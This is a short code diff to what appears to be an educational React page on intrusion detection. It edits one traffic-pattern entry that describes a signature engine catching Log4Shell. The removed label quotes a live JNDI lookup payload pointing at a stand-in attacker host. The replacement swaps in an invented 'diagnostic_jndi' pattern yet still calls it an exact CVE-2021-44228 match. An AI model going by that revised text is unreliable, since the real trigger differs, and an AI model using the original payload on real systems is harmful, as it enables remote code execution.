@@ -73,7 +73,7 @@ const Topic3 = () => {
   const trafficPatterns = {
     known_log4shell: {
       id: "known_log4shell",
-      label: "Known Log4Shell Exploit (${jndi:ldap://attacker.com/a})",
+      label: "Known Log4Shell Diagnostic Pattern (${diagnostic_jndi:ldap://test.internal/a})",
       payloadType: "Known CVE-2021-44228",
       rateCps: 12.0,
       entropy: 4.1,
@@ -81,7 +81,7 @@ const Topic3 = () => {
       anomalyScore: "Z = +0.2 (Within Normal Rate Limits)",
       verdict: "🚨 THREAT CAUGHT BY SIGNATURE ENGINE (Exact CVE Match!)",
       badgeColor: "bg-rose-950 text-rose-300 border-rose-700",
-      explanation: "Aho-Corasick DFA matched the `${jndi:` byte pattern in single pass. Signature engine dispatched instant high-confidence alert."
+      explanation: "Aho-Corasick DFA matched the '${diagnostic_jndi:' byte pattern in single pass. Signature engine dispatched instant high-confidence alert."
     },
     polymorphic_zeroday: {
       id: "polymorphic_zeroday",
